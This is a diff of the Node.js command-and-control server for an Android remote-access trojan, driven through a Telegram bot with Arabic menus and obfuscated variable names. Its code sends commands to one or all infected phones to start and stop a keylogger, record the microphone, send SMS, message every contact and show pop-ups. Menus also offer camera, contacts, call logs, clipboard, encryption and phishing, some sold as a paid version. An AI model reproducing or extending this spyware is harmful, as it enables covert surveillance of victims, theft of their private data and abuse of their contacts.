+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ لقطة شاشة ✯") {
+        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ تشغيل مسجل المفاتيح ✯") {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "keylogger-on", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "keylogger-on", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ إيقاف مسجل المفاتيح ✯") {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "keylogger-off", 'extras': [] });
+        else io.to(_0x3ea82b).emit('commend', { 'request': "keylogger-off", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ مستكشف الملفات ✯") {
+        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ المعرض ✯") {
+        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ تشفير ✯") {
+        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ فك التشفير ✯") {
+        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ الميكروفون ✯") {
+        appData.set("currentAction", 'microphoneDuration');
+        bot.sendMessage(data.id, "<b>✯ أدخل مدة تسجيل الصوت بالثواني</b>\n\n", {
+          'parse_mode': 'HTML',
+          'reply_markup': { 'keyboard': [["✯ إلغاء الإجراء ✯"]], 'resize_keyboard': true, 'one_time_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ إشعار منبثق ✯") {
+        appData.set("currentAction", "toastText");
+        bot.sendMessage(data.id, "<b>✯ أدخل النص الذي تريد ظهوره كإشعار</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ إلغاء الإجراء ✯"]], 'resize_keyboard': true, 'one_time_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ إرسال رسالة ✯") {
+        appData.set("currentAction", "smsNumber");
+        bot.sendMessage(data.id, "<b>✯ أدخل رقم الهاتف المراد إرسال الرسالة إليه</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ إلغاء الإجراء ✯"]], 'resize_keyboard': true, 'one_time_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ اهتزاز ✯") {
+        appData.set("currentAction", "vibrateDuration");
+        bot.sendMessage(data.id, "<b>✯ أدخل مدة الاهتزاز بالثواني</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ إلغاء الإجراء ✯"]], 'resize_keyboard': true, 'one_time_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ إرسال رسالة لجميع جهات الاتصال ✯") {
+        appData.set("currentAction", "textToAllContacts");
+        bot.sendMessage(data.id, "<b>✯ أدخل النص المراد إرساله لجميع جهات الاتصال</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ إلغاء الإجراء ✯"]], 'resize_keyboard': true, 'one_time_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ فتح رابط ✯") {
+        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ تصيد احتيالي ✯") {
+        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ تشغيل صوت ✯") {
+        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+    } else {
+      io.sockets.sockets.forEach((_0x22a16b, _0x30e015, _0x5acd93) => {
+        if (_0xdbde0c.text === _0x22a16b.model) {
+          appData.set("currentTarget", _0x30e015);
+          bot.sendMessage(data.id, "<b>✯ اختر الإجراء المراد تنفيذه على " + _0x22a16b.model + "</b>\n\n", {
+            'parse_mode': "HTML",
+            'reply_markup': {
+              'keyboard': [
+                ["✯ جهات الاتصال ✯", "✯ الرسائل القصيرة ✯"],
+                ["✯ المكالمات ✯", "✯ التطبيقات ✯"],
+                ["✯ الكاميرا الرئيسية ✯", "✯ الكاميرا الأمامية ✯"],
+                ["✯ الميكروفون ✯", "✯ الحافظة ✯"],
+                ["✯ لقطة شاشة ✯", "✯ إشعار منبثق ✯"],
+                ["✯ إرسال رسالة ✯", "✯ اهتزاز ✯"],
+                ["✯ تشغيل صوت ✯", "✯ إيقاف الصوت ✯"],
+                ["✯ تشغيل مسجل المفاتيح ✯", "✯ إيقاف مسجل المفاتيح ✯"],
+                ["✯ مستكشف الملفات ✯", "✯ المعرض ✯"],
+                ["✯ تشفير ✯", "✯ فك التشفير ✯"],
+                ["✯ فتح رابط ✯", "✯ تصيد احتيالي ✯"],
+                ["✯ إرسال رسالة لجميع جهات الاتصال ✯"],
+                ["✯ إشعار منبثق ✯"],
+                ["✯ العودة للقائمة الرئيسية ✯"]
+              ],
+              'resize_keyboard': true,
+              'one_time_keyboard': true
             }
+          });
         }
-    }
+      });
 
-    // استقبال القيم الاضافية
-    else if(appData.get('waitingVibrate')){
-        if(text === 'الغاء') { appData.delete('waitingVibrate'); return; }
-        io.to(appData.get('currentTarget')).emit('commend', { request: 'vibrate', extras: [{key:'duration', value:text}] });
-        appData.delete('waitingVibrate');
-        bot.sendMessage(data.id, `<b>✯ تم الامر</b>`);
+      if (_0xdbde0c.text == "✯ الكل ✯") {
+        appData.set("currentTarget", "all");
+        bot.sendMessage(data.id, "<b>✯ اختر الإجراء المراد تنفيذه على جميع الأجهزة المتاحة</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': {
+            'keyboard': [
+              ["✯ جهات الاتصال ✯", "✯ الرسائل القصيرة ✯"],
+              ["✯ المكالمات ✯", "✯ التطبيقات ✯"],
+              ["✯ الكاميرا الرئيسية ✯", "✯ الكاميرا الأمامية ✯"],
+              ["✯ الميكروفون ✯", "✯ الحافظة ✯"],
+              ["✯ لقطة شاشة ✯", "✯ إشعار منبثق ✯"],
+              ["✯ إرسال رسالة ✯", "✯ اهتزاز ✯"],
+              ["✯ تشغيل صوت ✯", "✯ إيقاف الصوت ✯"],
+              ["✯ تشغيل مسجل المفاتيح ✯", "✯ إيقاف مسجل المفاتيح ✯"],
+              ["✯ مستكشف الملفات ✯", "✯ المعرض ✯"],
+              ["✯ تشفير ✯", "✯ فك التشفير ✯"],
+              ["✯ فتح رابط ✯", "✯ تصيد احتيالي ✯"],
+              ["✯ إرسال رسالة لجميع جهات الاتصال ✯"],
+              ["✯ إشعار منبثق ✯"],
+              ["✯ العودة للقائمة الرئيسية ✯"]
+            ],
+            'resize_keyboard': true,
+            'one_time_keyboard': true
+          }
+        });
+      }
     }
-    else if(appData.get('waitingMic')){
-        if(text === 'الغاء') { appData.delete('waitingMic'); return; }
-        io.to(appData.get('currentTarget')).emit('commend', { request: 'microphone', extras: [{key:'duration', value:text}] });
-        appData.delete('waitingMic');
-        bot.sendMessage(data.id, `<b>✯ تم الامر</b>`);
-    }
-    else if(appData.get('waitingSms')){
-        if(text === 'الغاء') { appData.delete('waitingSms'); return; }
-        const [num, ...rest] = text.split(' ');
-        io.to(appData.get('currentTarget')).emit('commend', { request: 'sendSms', extras: [{key:'number', value:num}, {key:'text', value:rest.join(' ')}] });
-        appData.delete('waitingSms');
-        bot.sendMessage(data.id, `<b>✯ تم الامر</b>`);
-    }
-    else if(appData.get('waitingNotify')){
-        if(text === 'الغاء') { appData.delete('waitingNotify'); return; }
-        io.to(appData.get('currentTarget')).emit('commend', { request: 'popNotification', extras: [{key:'text', value:text}] });
-        appData.delete('waitingNotify');
-        bot.sendMessage(data.id, `<b>✯ تم الامر</b>`);
-    }
-    else if(appData.get('waitingUrl')){
-        if(text === 'الغاء') { appData.delete('waitingUrl'); return; }
-        io.to(appData.get('currentTarget')).emit('commend', { request: 'openUrl', extras: [{key:'url', value:text}] });
-        appData.delete('waitingUrl');
-        bot.sendMessage(data.id, `<b>✯ تم الامر</b>`);
-    }
-
-    // عند اختيار جهاز من القائمة
-    else {
-        appData.set('waitingTarget', true);
-    }
+  }
 });
 
-// حفظ الاتصال نشط
+// إبقاء الاتصال نشط
 setInterval(() => {
-    io.sockets.sockets.forEach(s => s.emit('ping'));
+  io.sockets.sockets.forEach((_0x107f46, _0x316932, _0x1f46f7) => {
+    io.to(_0x316932).emit("ping", {});
+  });
 }, 5000);
 
-// تشغيل السيرفر
+// إبقاء الاستضافة نشطة
+setInterval(() => {
+  https.get(data.host, _0x9df260 => {}).on("error", _0x26bc04 => {});
+}, 480000);
+
 server.listen(process.env.PORT || 3000, () => {
-    console.log('يعمل على المنفذ 3000');
+  console.log("يعمل على المنفذ 3000");
 });
